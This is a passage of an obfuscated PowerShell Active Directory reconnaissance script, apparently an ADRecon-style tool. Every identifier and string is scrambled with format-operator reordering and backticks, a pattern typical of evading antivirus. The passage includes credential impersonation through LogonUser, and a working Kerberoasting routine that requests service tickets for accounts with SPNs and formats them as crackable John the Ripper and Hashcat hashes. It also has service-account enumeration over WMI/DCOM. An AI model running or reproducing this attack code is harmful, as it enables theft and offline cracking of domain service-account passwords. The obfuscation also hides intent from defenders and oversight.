            &("{2}{0}{1}" -f'-','Module','Import') ("{2}{0}{1}"-f 'l','icy','GroupPo') -WarningAction ("{1}{0}"-f 'top','S') -ErrorAction ("{0}{1}" -f'St','op') | &("{1}{2}{0}"-f 'l','Ou','t-Nul')
            If (${SAVe`VE`Rbose`pr`efErEnce})
            {
                ${S`crIPt:`V`ERb`o`Se`pREFerEncE} = ${savEveR`BO`SEpReFe`R`EnCe}
                &("{0}{2}{1}" -f 'Remo','-Variable','ve') ("{4}{1}{2}{3}{0}" -f'ce','Ve','rbosePref','eren','Save')
            }
        }
        Catch
        {
            &("{2}{1}{0}{3}" -f 'e-Warnin','rit','W','g') ("{1}{3}{4}{5}{9}{10}{8}{0}{12}{11}{7}{6}{2}" -f ' ','[Get-ADRGPOR','t','epo','rt] Err','or i','por','e','the','mpo','rting ','dule. Skipping GPOR','GroupPolicy Mo')
            &("{0}{2}{1}" -f 'Wri','Verbose','te-') "[EXCEPTION] $($_.Exception.Message) "
            If (${S`Ave`V`erb`OsEPReFER`E`NcE})
            {
                ${Scr`iPt:verb`ose`PR`eF`eRe`N`ce} = ${SaVe`Verbo`SE`pre`FerEN`CE}
                &("{2}{0}{3}{1}"-f'emo','e-Variable','R','v') ("{1}{2}{4}{3}{0}" -f'ce','Save','VerbosePre','eren','f')
            }
            Return ${n`Ull}
        }
        Try
        {
            &("{2}{1}{0}" -f 'erbose','-V','Write') ("{0}{2}{1}{3}" -f'[','e','*] GPOR','port XML')
            ${ADF`ILeNA`Me} = -join(${ADRou`TpUt`DIr},'\',("{0}{2}{1}"-f'G','port','PO-Re'),("{0}{1}"-f'.x','ml'))
            &("{3}{2}{1}{0}" -f'Report','GPO','et-','G') -All -ReportType ("{1}{0}" -f'ML','X') -Path ${AD`FILE`NaME}
        }
        Catch
        {
            If (${u`seA`lTC`ReDs})
            {
                &("{1}{0}{3}{2}"-f'War','Write-','ing','n') ("{3}{5}{4}{1}{2}{0}" -f 'AS.','usin','g RUN','[*] Ru','l ','n the too')
                &("{1}{2}{0}{3}"-f 'ni','W','rite-War','ng') ((("{10}{9}{1}{13}{7}{0}{12}{3}{2}{8}{5}{4}{11}{6}" -f ' FQDN>g1x<U','<D','e','> /n','s','ly power','e','n','ton','s /user:','[*] runa','hell.ex','sername','omai'))-Creplace'g1x',[CHar]92)
                Return ${nU`LL}
            }
            &("{1}{0}{2}"-f'Warn','Write-','ing') ("{3}{7}{1}{5}{2}{8}{6}{4}{0}"-f 'in XML','D','r','[Get-',' ','RGPOReport] Er','ng the GPOReport','A','or getti')
            &("{1}{0}{2}" -f 'te-Ver','Wri','bose') "[EXCEPTION] $($_.Exception.Message) "
        }
        Try
        {
            &("{0}{1}{2}"-f'Writ','e-','Verbose') ("{2}{0}{3}{1}" -f 'G','t HTML','[*] ','PORepor')
            ${a`dFIl`ename} = -join(${A`dROU`TPutd`iR},'\',("{0}{2}{1}" -f 'GPO-R','rt','epo'),("{1}{0}" -f 'html','.'))
            &("{0}{4}{3}{2}{1}" -f 'G','t','r','t-GPORepo','e') -All -ReportType ("{1}{0}" -f 'L','HTM') -Path ${aDFIl`en`AMe}
        }
        Catch
        {
            If (${USEA`L`TCr`Eds})
            {
                &("{3}{2}{1}{0}"-f'arning','W','-','Write') ("{1}{7}{0}{6}{3}{5}{4}{2}"-f 'e t','[','.',' using ','UNAS','R','ool','*] Run th')
                &("{2}{1}{3}{0}{4}"-f'i','rite','W','-Warn','ng') ((("{1}{11}{4}{7}{0}{8}{2}{5}{6}{9}{10}{3}" -f 'us','[','ain F','.exe','] runas ','QDN>HWa<Userna','me> /','/','er:<Dom','net','only powershell','*')) -CRePLACE'HWa',[Char]92)
                Return ${nu`lL}
            }
            &("{0}{2}{1}" -f'W','te-Warning','ri') ("{3}{0}{5}{10}{8}{9}{4}{7}{6}{2}{1}"-f 'A',' XML','n','[Get-','e GPO','DRGPOReport] Error g','i','Report ','ting t','h','et')
            &("{3}{4}{1}{0}{2}"-f'erbos','-V','e','Wri','te') "[EXCEPTION] $($_.Exception.Message) "
        }
    }
    If (${M`ethOd} -eq ("{0}{1}"-f 'LDA','P'))
    {
        &("{1}{0}{4}{3}{2}"-f 'te-','Wri','ing','rn','Wa') ("{10}{9}{8}{5}{1}{11}{7}{6}{3}{4}{2}{0}" -f 'DWS.',', ','ted with A',' ','is only suppor','y','dule','e mo','urrentl',' C','[*]','th')
    }
}


Function g`ET-AD`Ru`Ser`I`Mpe`RsoNatION
{


    [OutputType([IntPtr])]
    [CmdletBinding(dEFAulTpARAMETersEtNAmE = {"{1}{2}{0}" -f 'tial','C','reden'})]
    Param(
        [Parameter(mANdaTORy = ${tr`Ue}, pARameTeRsetNAMe = "cRed`EnTi`AL")]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CRed`ent`IAl},

        [Parameter(mandATOrY = ${Tr`UE}, PaRamEterSETNAME = "ToKE`N`H`Andle")]
        [ValidateNotNull()]
        [IntPtr]
        ${To`ke`N`hanDLE},

        [Switch]
        ${qUI`et}
    )

    If (( (gEt-item ('v'+'A'+'riabLE:BJ'+'6')).vaLUE::"cur`Rent`THr`eAd".("{2}{0}{4}{1}{3}"-f'e','tat','GetApartm','e','ntS').Invoke() -ne 'STA') -and (-not ${PSBOu`N`dPAR`AmeTerS}[("{1}{0}"-f'iet','Qu')]))
    {
        &("{2}{0}{4}{3}{1}" -f 'e-Wa','g','Writ','n','rni') ("{17}{33}{20}{22}{8}{2}{31}{1}{23}{29}{14}{32}{27}{3}{18}{10}{15}{12}{25}{16}{30}{0}{7}{11}{13}{5}{28}{6}{34}{4}{19}{9}{21}{26}{24}"-f'readed ',' pow','Imper','o','tio','ke','rs','ap','r',' n','cu','artm','ently in a si','ent state, to','ell.ex','rr','gl','[','t ','n may','AD','ot wo','RUse','ers','k.','n','r',' is n','n impe','h','e-th','sonation]','e','Get-','ona')
    }

    If (${P`sbOuN`Dp`ArAME`TeRs}[("{1}{2}{0}"-f 'Handle','To','ken')])
    {
        ${lOGOnt`oKE`NHa`N`d`lE} = ${Token`HanD`LE}
    }
    Else
    {
        ${l`O`GoNTOkE`Nhan`DLe} =  $qKv::"Ze`RO"
        ${N`eTW`oRkCR`edenTIAL} = ${c`R`EdENtIAL}.("{0}{1}{2}{3}" -f'Get','N','etworkCredentia','l').Invoke()
        ${US`eR`Doma`IN} = ${N`eTW`OR`k`CrEdent`iAl}."do`Ma`iN"
        If (-Not ${U`s`ErdO`main})
        {
            &("{2}{3}{4}{1}{0}"-f 'g','n','Write-','Warn','i') ((("{8}{17}{12}{2}{9}{1}{4}{15}{19}{7}{18}{13}{3}{10}{6}{11}{16}{0}{5}{14}" -f'i','ation]','so','ith D',' U','n FQDN>I','n FQ','t','[','n','omai','DN. (<D','per','w','uJ<Username>)','se c','oma','Get-ADRUserIm','ial ','reden'))  -REPlaCe ([CHar]73+[CHar]117+[CHar]74),[CHar]92)
        }
        ${uSERN`A`me} = ${nETw`o`RKCREdentI`Al}."U`S`ERnamE"
        &("{2}{3}{0}{1}" -f'e-Warnin','g','Wr','it') "[Get-ADRUserImpersonation] Executing LogonUser() with user: $($UserDomain)\$($UserName) "

        
        
        ${R`E`SUlt} = ${AD`VAP`I32}::("{2}{0}{1}"-f 'gon','User','Lo').Invoke(${U`S`eRNAme}, ${uS`er`DomaIn}, ${NetW`o`RKCRede`NtIaL}."Pas`s`wORD", 9, 3, [ref]${lOgon`T`ok`EN`HAnDle})
        ${La`S`Te`Rror} =  (  GCi ("Va"+"rIABLE:Xn"+"JZS")  ).vALuE::("{0}{3}{1}{2}"-f'G','astWin3','2Error','etL').Invoke();

        If (-not ${rE`SU`lt})
        {
            throw "[Get-ADRUserImpersonation] LogonUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message) "
        }
    }

    
    ${R`eSu`LT} = ${a`Dv`APi32}::("{0}{2}{4}{3}{1}" -f 'Imp','gedOnUser','ersonate','og','L').Invoke(${lOgOn`TOK`enha`NdLe})

    If (-not ${res`UlT})
    {
        throw "[Get-ADRUserImpersonation] ImpersonateLoggedOnUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message) "
    }

    &("{3}{2}{1}{0}" -f 'Verbose','-','te','Wri') ("{11}{13}{17}{12}{5}{3}{9}{15}{10}{14}{16}{2}{18}{6}{0}{7}{4}{1}{8}"-f'ssfull','ona','suc','sonat','rs','r','e','y impe','ted','ion] ','e credentia','[Get-','UserImpe','ADR','ls','Alternat',' ','-','c')
    ${L`oG`O`N`TO`kenHAnDle}
}


Function G`eT-`AdrRe`Vert`ToSElF
{


    [CmdletBinding()]
    Param(
        [ValidateNotNull()]
        [IntPtr]
        ${t`oKenha`NdlE}
    )

    If (${P`s`B`ouNDpaRa`M`ETerS}[("{2}{1}{0}"-f'dle','n','TokenHa')])
    {
        &("{0}{2}{1}" -f'Write-Wa','ning','r') ("{10}{0}{15}{1}{19}{9}{7}{5}{20}{6}{21}{2}{13}{3}{11}{14}{4}{8}{16}{18}{12}{17}"-f '-ADRRev','oSe','i','d','go','verti','ken impers','Re','nU','] ','[Get',' clos','oke','on an','ing Lo','ertT','ser()','n handle',' t','lf','ng to','onat')
        ${Res`U`LT} = ${Ke`RN`el32}::("{2}{0}{3}{1}"-f 'eH','le','Clos','and').Invoke(${T`OkeNh`A`NDle})
    }

    ${res`ULT} = ${AD`V`Api32}::("{1}{2}{0}"-f 'ToSelf','Re','vert').Invoke()
    ${La`S`TERroR} =  (  get-VariABLe  XNJzS  ).VaLuE::("{0}{3}{2}{1}{4}" -f'Get','ro','in32Er','LastW','r').Invoke();

    If (-not ${r`e`sulT})
    {
        &("{2}{0}{1}" -f'rite-','Error','W') "[Get-ADRRevertToSelf] RevertToSelf() Error: $(([ComponentModel.Win32Exception] $LastError).Message) "
    }

    &("{0}{1}{2}{3}{4}"-f'W','rite-Ver','bo','s','e') ("{6}{5}{0}{8}{2}{1}{9}{10}{3}{4}{11}{7}"-f'vertTo','impe','oken ','t','ion successfully rever','e','[Get-ADRR','d','Self] T','rs','ona','te')
}


Function gE`T-ad`RS`PNti`CKEt
{

    param(
        [Parameter(MaNDAtORY = ${t`RUE})]
        [string] ${u`se`RSPn}
    )

    Try
    {
        ${n`ULl} =  $G941F::("{0}{3}{2}{1}" -f 'Loa','ame','hPartialN','dWit').Invoke(("{2}{0}{1}{3}"-f 'yste','m.IdentityMode','S','l'))
        ${TIcK`et} = &("{3}{2}{0}{1}"-f'j','ect','b','New-O') ("{6}{4}{7}{8}{3}{0}{10}{11}{9}{1}{2}{5}"-f 'berosR','it','y','odel.Tokens.Ker','ystem.I','Token','S','denti','tyM','r','eq','uestorSecu') -ArgumentList ${u`SERS`PN}
    }
    Catch
    {
        &("{1}{2}{3}{0}"-f'ng','W','rite-Warn','i') ('[Get'+'-AD'+'RSPNTic'+'ket'+']'+' '+'Erro'+'r '+'r'+'equ'+'esting '+'tic'+'ket'+' '+'for'+' '+'SP'+'N '+"$UserSPN")
        &("{0}{2}{3}{1}{4}"-f 'Writ','r','e-','Wa','ning') "[EXCEPTION] $($_.Exception.Message) "
        Return ${N`Ull}
    }

    If (${tiCk`et})
    {
        ${T`Ic`keTbYTeStr`EaM} = ${TI`CK`ET}.("{0}{2}{1}"-f 'GetRequ','t','es').Invoke()
    }

    If (${ti`CK`E`TBy`TestreAM})
    {
        ${TiCkE`THE`xstR`EAM} =   (lS  VArIabLe:42n ).VaLUe::("{2}{0}{1}"-f 'i','ng','ToStr').Invoke(${t`i`cKe`TBYt`E`StreaM}) -replace '-'

        
        
        If (${tiC`KeTh`e`XSTre`AM} -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)')
        {
            ${ETy`pE} =   (gET-chiLdiTem ('V'+'ARiab'+'lE:0528'+'Hs')).vaLUe::("{0}{1}" -f 'To','Byte').Invoke( ${MA`Tc`Hes}."EtYp`EL`eN", 16 )
            ${C`iPH`e`RTExtLeN} =   (Get-ItEm  ('VarIA'+'bLE:0528h'+'S')  ).vaLUE::("{2}{0}{1}" -f'oUI','nt32','T').Invoke(${MaT`CHeS}."C`iPhE`RTeXt`lEN", 16)-4
            ${ciPHeRt`e`xT} = ${m`AtC`HEs}."Da`T`ATOeNd".("{0}{2}{1}" -f'Substr','ng','i').Invoke(0,${ciPhE`RtEXt`l`eN}*2)

            
            If (${m`AtCHES}."D`Atat`OeND".("{1}{0}" -f 'ring','Subst').Invoke(${C`IPhERt`E`X`TLEn}*2, 4) -ne ("{0}{1}"-f'A48','2'))
            {
                &("{3}{1}{2}{0}"-f'arning','i','te-W','Wr') ('[G'+'et-ADRS'+'PNT'+'icket] '+'Er'+'ror '+'par'+'s'+'ing '+'c'+'ip'+'hertex'+'t '+'fo'+'r '+'th'+'e '+'S'+'PN '+' '+(('tD'+'L(t'+'DLTi'+'ck'+'et.S'+'e'+'rvice'+'Pri'+'nc'+'i'+'palName'+').')-crePlAcE([cHAR]116+[cHAR]68+[cHAR]76),[cHAR]36)) 
                ${ha`sH} = ${n`UlL}
            }
            Else
            {
                ${H`AsH} = "$($CipherText.Substring(0,32))`$$($CipherText.Substring(32))"
            }
        }
        Else
        {
            &("{2}{1}{3}{0}"-f'g','War','Write-','nin') "[Get-ADRSPNTicket] Unable to parse ticket structure for the SPN  $($Ticket.ServicePrincipalName). " 
            ${Ha`Sh} = ${NU`LL}
        }
    }
    ${o`Bj} = &("{1}{0}{2}"-f'Objec','New-','t') ("{0}{1}{2}" -f 'P','SOb','ject')
    ${o`Bj} | &("{0}{3}{2}{1}"-f 'Ad','ember','M','d-') -MemberType ("{1}{3}{0}{2}"-f'oper','Note','ty','Pr') -Name ("{0}{3}{2}{1}" -f 'S','ncipalName','ri','erviceP') -Value ${T`IC`KEt}."SeR`VIC`EprINCIpaln`Ame"
    ${O`Bj} | &("{2}{1}{0}"-f 'mber','-Me','Add') -MemberType ("{3}{0}{2}{1}"-f 'teP','erty','rop','No') -Name ("{0}{1}"-f 'E','type') -Value ${E`TYPe}
    ${O`Bj} | &("{0}{1}{2}"-f'Add','-Mem','ber') -MemberType ("{0}{1}{2}"-f'NoteP','ro','perty') -Name ("{1}{0}" -f'sh','Ha') -Value ${h`Ash}
    Return ${o`Bj}
}

Function Get-a`DRK`ER`BErOAST
{

    param(
        [Parameter(MandatORy = ${t`RuE})]
        [string] ${met`hod},

        [Parameter(mAndAtORY = ${Fa`l`Se})]
        [DirectoryServices.DirectoryEntry] ${O`BJ`Dom`AIN},

        [Parameter(MANdATOrY = ${fa`l`sE})]
        [Management.Automation.PSCredential] ${cReD`ent`ial} =  $NK5P::"e`mpTy",

        [Parameter(MAnDATOry = ${TR`Ue})]
        [int] ${P`A`GEsize}
    )

    If (${c`REdEN`Tial} -ne   $NK5p::"e`mPTy")
    {
        ${LoGo`NTOK`eN} = &("{0}{4}{7}{2}{1}{5}{6}{3}" -f 'Ge','pe','Im','on','t-ADRU','rsonat','i','ser') -Credential ${Cred`EN`TIAl}
    }

    If (${meth`od} -eq ("{0}{1}"-f 'AD','WS'))
    {
        Try
        {
            ${aD`USerS} = &("{2}{1}{0}"-f 'ct','t-ADObje','Ge') -LDAPFilter ((("{19}{23}{15}{3}{5}{11}{1}{22}{6}{8}{13}{2}{16}{24}{20}{21}{14}{12}{7}{18}{0}{10}{4}{17}{9}"-f '840.11','ePrin','=','Cl','56.1.4.80','ass=computer)(servi','ipal',':1.2','Na',':=2))','35','c','trol','me','n','ect','*','3','.','(&(!','Accoun','tCo','c','obj',')(!user'))) -Properties ("{0}{1}{3}{4}{2}"-f's','AMAcc','e','ou','ntNam'),("{3}{2}{1}{4}{0}" -f 'e','inc','r','serviceP','ipalNam'),("{2}{0}{1}{4}{5}{3}"-f's','he','Distingui','e','d','Nam') -ResultPageSize ${pAG`e`siZE}
        }
        Catch
        {
            &("{2}{1}{0}{3}"-f'arn','te-W','Wri','ing') ("{8}{13}{1}{0}{2}{11}{9}{4}{6}{3}{5}{12}{7}{10}" -f 'r','e','beroast] Error wh',' UserS','e','PN','numerating','bject','[Get-A',' ','s','ile',' O','DRK')
            &("{1}{3}{0}{2}"-f'rbos','Wr','e','ite-Ve') "[EXCEPTION] $($_.Exception.Message) "
            Return ${nu`ll}
        }

        If (${a`dUS`ers})
        {
            ${US`eRSp`NoBj} = @()
            ${AdUsE`RS} | &("{1}{2}{0}" -f'ct','Fo','rEach-Obje') {
                ForEach (${u`SErsPN} in ${_}."s`ERvi`cepr`incipa`Ln`AmE")
                {
                    ${O`BJ} = &("{0}{1}{2}" -f 'New-O','bjec','t') ("{0}{1}{2}" -f 'P','SObj','ect')
                    ${O`BJ} | &("{1}{2}{0}" -f'r','A','dd-Membe') -MemberType ("{2}{0}{1}{3}"-f'tePr','oper','No','ty') -Name ("{2}{1}{0}" -f'e','rnam','Use') -Value ${_}."sAmaC`c`o`U`NtNAmE"
                    ${O`Bj} | &("{2}{0}{1}{3}" -f'd','-Mem','Ad','ber') -MemberType ("{1}{2}{0}{3}" -f'rt','N','otePrope','y') -Name ("{4}{1}{2}{3}{0}" -f 'ipalName','rvi','c','ePrinc','Se') -Value ${usE`RsPN}

                    ${Has`HOBj} = &("{3}{1}{2}{4}{0}" -f't','SPNT','ick','Get-ADR','e') ${UsErS`PN}
                    If (${h`A`shOBJ})
                    {
                        ${usEr`DO`mA`in} = ${_}."DisTi`NgU`I`ShE`dnA`mE".("{1}{2}{0}" -f'ring','Su','bSt').Invoke(${_}."di`STiNGuis`he`D`NA`ME".("{0}{1}" -f'Index','Of').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                        
                        ${JTr`ha`sh} = "`$krb5tgs`$$($HashObj.ServicePrincipalName):$($HashObj.Hash)"
                        
                        ${ha`SH`CAthash} = "`$krb5tgs`$$($HashObj.Etype)`$*$($_.SamAccountName)`$$UserDomain`$$($HashObj.ServicePrincipalName)*`$$($HashObj.Hash)"
                    }
                    Else
                    {
                        ${jTRh`A`sH} = ${N`UlL}
                        ${Has`Hc`AthaSH} = ${N`Ull}
                    }
                    ${o`Bj} | &("{1}{2}{0}" -f 'Member','Add','-') -MemberType ("{2}{3}{1}{0}" -f'rty','e','Note','Prop') -Name ("{0}{1}"-f 'Jo','hn') -Value ${jt`RhAsH}
                    ${O`Bj} | &("{1}{0}{3}{2}"-f'-M','Add','er','emb') -MemberType ("{2}{3}{0}{1}" -f 'Pro','perty','Not','e') -Name ("{2}{0}{1}" -f 'sh','cat','Ha') -Value ${HASh`CaTh`ASH}
                    ${U`S`e`RSpnobj} += ${O`BJ}
                }
            }
            &("{0}{1}{3}{2}"-f'Remo','ve-Va','e','riabl') ("{0}{1}{2}" -f'A','D','Users')
        }
    }

    If (${mET`hoD} -eq ("{0}{1}"-f'LD','AP'))
    {
        ${oBjsE`AR`chER} = &("{2}{1}{3}{0}"-f'ject','w-O','Ne','b') ("{3}{5}{1}{8}{0}{2}{9}{6}{7}{4}"-f 'v','r','i','System.D','r','irecto','S','earche','ySer','ces.Directory') ${o`B`JdOmAiN}
        ${oBjsE`Ar`C`hEr}."PAG`E`sizE" = ${PAGE`S`IZE}
        ${o`B`JsEarcH`eR}."f`Il`Ter" = ((("{14}{11}{13}{1}{3}{12}{0}{8}{10}{4}{15}{7}{9}{2}{5}{6}" -f 'er)(se','jectCl','.1','ass=co',')(!userAcc','13556.1.4.','803:=2))','ntControl:1','rvicePrincipalName=','.2.840','*','!o','mput','b','(&(','ou')))
        ${oB`Jse`Ar`ChER}."P`RO`pe`R`TiEStOlOAd".("{0}{2}{1}"-f 'AddR','nge','a').Invoke((("{3}{0}{2}{1}" -f 'i','hedname','s','distingu'),("{3}{1}{2}{0}{4}"-f 'untna','mac','co','sa','me'),("{5}{1}{4}{3}{0}{2}" -f'l','r','name','cipa','viceprin','se'),("{0}{2}{1}{4}{3}"-f'useraccountco','tr','n','l','o')))
        ${oBJS`eaRc`H`er}."SeArChS`C`OpE" = ("{1}{2}{0}"-f 'e','Sub','tre')
        Try
        {
            ${ad`Use`Rs} = ${o`B`jS`eArCher}.("{0}{1}{2}" -f 'Fi','ndAl','l').Invoke()
        }
        Catch
        {
            &("{4}{3}{1}{0}{2}"-f'rnin','e-Wa','g','it','Wr') ("{11}{9}{3}{1}{4}{14}{2}{13}{8}{16}{0}{5}{7}{6}{10}{15}{12}" -f 'merat','K','] Error wh','R','erberoas','i','N O','ng UserSP','le e','-AD','b','[Get','s','i','t','ject','nu')
            &("{1}{0}{2}{3}"-f'rite-Ve','W','r','bose') "[EXCEPTION] $($_.Exception.Message) "
            Return ${Nu`Ll}
        }
        ${obJseARc`h`er}.("{0}{1}"-f'dispo','se').Invoke()

        If (${aDu`s`ers})
        {
            ${user`SpNo`Bj} = @()
            ${ADus`E`Rs} | &("{2}{4}{1}{3}{0}"-f'ject','-O','ForE','b','ach') {
                ForEach (${US`e`RSPN} in ${_}."p`RopeRTI`eS"."sERVi`cePRInciP`Al`N`AME")
                {
                    ${o`Bj} = &("{1}{2}{0}"-f 't','New','-Objec') ("{0}{1}" -f 'PSObje','ct')
                    ${O`Bj} | &("{3}{0}{2}{1}"-f'-Me','er','mb','Add') -MemberType ("{0}{1}{2}" -f'No','tePro','perty') -Name ("{0}{2}{1}"-f 'U','e','sernam') -Value ${_}."pROpe`Rti`ES"."SA`mAcCo`UN`TNamE"[0]
                    ${O`Bj} | &("{0}{1}{2}" -f'A','dd','-Member') -MemberType ("{2}{0}{1}" -f 'o','teProperty','N') -Name ("{3}{2}{1}{0}" -f 'e','lNam','a','ServicePrincip') -Value ${u`ser`sPN}

                    ${Ha`S`HObj} = &("{3}{2}{1}{0}"-f 't','PNTicke','S','Get-ADR') ${U`sER`SPn}
                    If (${Has`Ho`BJ})
                    {
                        ${Use`R`doMa`IN} = ${_}."P`ROPERTI`eS"."DisTInGu`iSHeD`N`AME"[0]."suBS`T`RInG"(${_}."PR`opE`Rt`ies"."dist`INg`U`ISH`eDN`AME"[0].("{1}{0}"-f'ndexOf','I').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                        
                        ${j`Tr`HaSH} = "`$krb5tgs`$$($HashObj.ServicePrincipalName):$($HashObj.Hash)"
                        
                        ${hA`S`hCAthasH} = "`$krb5tgs`$$($HashObj.Etype)`$*$($_.Properties.samaccountname)`$$UserDomain`$$($HashObj.ServicePrincipalName)*`$$($HashObj.Hash)"
                    }
                    Else
                    {
                        ${jTr`hA`Sh} = ${nU`lL}
                        ${hAshCA`THa`sh} = ${nU`Ll}
                    }
                    ${O`BJ} | &("{2}{1}{0}" -f 'ber','dd-Mem','A') -MemberType ("{0}{2}{1}{3}" -f 'Not','ropert','eP','y') -Name ("{1}{0}"-f 'hn','Jo') -Value ${JTrh`A`sh}
                    ${O`Bj} | &("{2}{0}{1}"-f'dd','-Member','A') -MemberType ("{2}{3}{0}{1}" -f 'per','ty','NotePr','o') -Name ("{1}{2}{0}" -f 'at','Ha','shc') -Value ${haShc`A`T`HaSh}
                    ${U`sERs`PN`oBJ} += ${o`Bj}
                }
            }
            &("{0}{2}{3}{1}" -f 'Remove-Va','ble','r','ia') ("{0}{2}{1}"-f'A','Users','D')
        }
    }

    If (${l`ogO`NT`oKEn})
    {
        &("{4}{3}{5}{2}{1}{0}"-f'f','l','e','t-A','Ge','DRRevertToS') -TokenHandle ${lo`GOn`TOkeN}
    }

    If (${US`eRS`pNoBJ})
    {
        Return ${Use`R`sPno`BJ}
    }
    Else
    {
        Return ${n`ULl}
    }
}


Function g`E`T-`AdRDOMaI`NaCC`OunTS`USeDfORS`eRVI`c`Elogon
{

    param(
        [Parameter(MandatoRY = ${tR`UE})]
        [string] ${ME`TH`Od},

        [Parameter(MAnDATorY = ${F`Alse})]
        [DirectoryServices.DirectoryEntry] ${OBJ`DOMa`in},

        [Parameter(MAnDaTOrY = ${F`ALSE})]
        [Management.Automation.PSCredential] ${cRed`eNtI`AL} =  $NK5p::"e`MpTY",

        [Parameter(ManDaTory = ${T`RUE})]
        [int] ${pA`G`EsiZe},

        [Parameter(mANDaTORy = ${FAl`se})]
        [int] ${T`hReA`dS} = 10
    )

    BEGIN {
        ${R`ea`dsErvIC`E`A`ccoUnTS} = [scriptblock] {
            
            ${h`OstNAmE} = [string] ${a`RgS}[0]
            ${OpEr`AT`In`GSY`SteM} = [string] ${Ar`gS}[1]
            
            ${C`REdent`i`Al} = ${A`RGs}[2]
            ${TImeo`UT} = 250
            ${P`Ort} = 135
            Try
            {
                ${TCpCL`Ie`Nt} = &("{1}{0}{2}" -f'e','New-Obj','ct') ("{3}{2}{6}{1}{5}{4}{7}{0}"-f't','e','ys','S','pC','m.Net.Sockets.Tc','t','lien')
                ${rEsu`LT} = ${tCPcL`I`enT}.("{3}{0}{1}{2}" -f'g','inCon','nect','Be').Invoke(${HO`sT`NAMe},${pO`RT},${N`ULL},${n`Ull})
                ${SU`CC`ESS} = ${r`Es`ULT}."ASyncWai`Th`A`ND`lE".("{0}{1}" -f 'WaitO','ne').Invoke(${TiMe`OUt},${n`UlL})
            }
            Catch
            {
                ${w`ARN`Ing} = "$hostname ($OperatingSystem) is unreachable $($_.Exception.Message) "
                ${SUCCe`sS} = ${f`AL`Se}
                ${TCP`cl`IENT}.("{0}{1}" -f'C','lose').Invoke()
            }
            If (${suC`cE`SS})
            {
                
                If (${p`SVErsiO`Nta`BlE}."p`SVeR`sIOn"."ma`JOr" -ne 2)
                {
                    If (${c`RedE`NTIal} -ne   $nK5p::"em`PTy")
                    {
                        ${sE`ssIOn} = &("{1}{0}{2}{3}"-f '-C','New','im','Session') -ComputerName ${h`osT`NAME} -SessionOption $(&("{3}{4}{0}{2}{1}"-f'essionOp','ion','t','New-Cim','S') -Protocol ("{0}{1}" -f 'DC','OM')) -Credential ${CRED`ENT`I`AL}
                        If (${SEsS`I`on})
                        {
                            ${SeRV`iC`ELIsT} = @( &("{1}{4}{0}{2}{3}" -f 'Inst','Get','an','ce','-Cim') -ClassName ("{1}{2}{0}"-f'ce','Win32_','Servi') -Property ("{1}{0}" -f 'e','Nam'),("{1}{0}"-f'ame','StartN'),("{1}{0}{2}"-f 'ystemN','S','ame') -CimSession ${se`Ss`iON} -ErrorAction ("{1}{0}"-f'top','S'))
                        }
                    }
                    Else
                    {
                        ${ses`sion} = &("{4}{3}{0}{1}{2}"-f 'Cim','Se','ssion','ew-','N') -ComputerName ${hoSTn`A`me} -SessionOption $(&("{1}{6}{0}{4}{2}{3}{5}" -f'imSe','New-','pt','i','ssionO','on','C') -Protocol ("{1}{0}"-f 'COM','D'))
                        If (${ses`s`IoN})
                        {
                            ${Se`R`VI`ceLIsT} = @( &("{3}{0}{1}{2}" -f'CimI','nsta','nce','Get-') -ClassName ("{3}{0}{2}{1}" -f 'in32_Se','e','rvic','W') -Property ("{1}{0}" -f 'e','Nam'),("{2}{0}{1}" -f'art','Name','St'),("{2}{1}{0}" -f 'me','a','SystemN') -CimSession ${seS`Si`oN} -ErrorAction ("{1}{0}"-f'op','St') )
                        }
                    }
                }
                Else
                {
                    If (${c`REdE`Nt`ial} -ne   ( Get-VaRIaBle Nk5P  -VA )::"E`MpTY")
                    {
                        ${serViC`E`LIsT} = @( &("{2}{0}{1}"-f'O','bject','Get-Wmi') -Class ("{2}{0}{1}"-f'n','32_Service','Wi') -ComputerName ${H`OStNa`mE} -Credential ${cr`EDe`NTIal} -Impersonation 3 -Property ("{1}{0}"-f'me','Na'),("{1}{0}{2}" -f 'tartNa','S','me'),("{2}{1}{0}" -f'e','emNam','Syst') -ErrorAction ("{0}{1}"-f 'Sto','p') )
                    }
                    Else
                    {
                        ${seRVI`C`E`LIsT} = @( &("{2}{3}{1}{0}" -f 'Object','mi','Get','-W') -Class ("{0}{2}{1}" -f'Win3','ce','2_Servi') -ComputerName ${H`O`STNamE} -Property ("{1}{0}"-f 'me','Na'),("{0}{2}{1}" -f 'St','tName','ar'),("{2}{1}{0}" -f 'Name','m','Syste') -ErrorAction ("{0}{1}"-f'St','op') )
                    }
                }
                ${Se`RVi`C`eLIsT}
            }
            Try
            {
                If (${t`CPCLi`eNT}) { ${T`CPcLi`ENT}.("{1}{0}{2}" -f'dCo','En','nnect').Invoke(${REs`ULT}) | &("{0}{1}{2}"-f'O','ut-','Null') }
            }
            Catch
            {
                ${Wa`RnIng} = "$hostname ($OperatingSystem) : $($_.Exception.Message) "
            }
            ${W`A`RniNG}
        }

        Function P`Roces`scOmPl`EtEdJOBs()
        {
            
            

            ${jo`BS} = &("{2}{1}{0}"-f 'ob','J','Get-') -State ("{1}{0}{2}" -f'pl','Com','eted')
            ForEach( ${J`Ob} in ${j`obs} )
            {
                If (${nU`LL} -ne ${j`Ob})
                {
                    ${DA`TA} = &("{0}{3}{2}{1}" -f'Rece','Job','e-','iv') ${j`Ob}
                    &("{1}{2}{0}" -f'b','Remo','ve-Jo') ${j`oB}
                }

                If (${D`ATA})
                {
                    If ( ${d`ATa}.("{2}{0}{1}"-f 'etTy','pe','G').Invoke() -eq [Object[]] )
                    {
                        ${se`RV`iCEL`iST} = ${d`ATA} | &("{3}{1}{2}{0}"-f'Object','e','-','Wher') { if (${_}."STa`Rt`Name") { ${_} }}
                        ${s`eR`VIcelIST} | &("{2}{3}{4}{1}{0}"-f'ect','bj','Fo','rE','ach-O') {
                            ${O`Bj} = &("{1}{0}{2}" -f 'Objec','New-','t') ("{2}{1}{0}"-f'bject','SO','P')
                            ${O`Bj} | &("{2}{1}{0}"-f 'er','mb','Add-Me') -MemberType ("{1}{2}{3}{0}" -f 'roperty','No','te','P') -Name ("{0}{1}{2}" -f'Ac','c','ount') -Value ${_}."Star`T`NaMe"
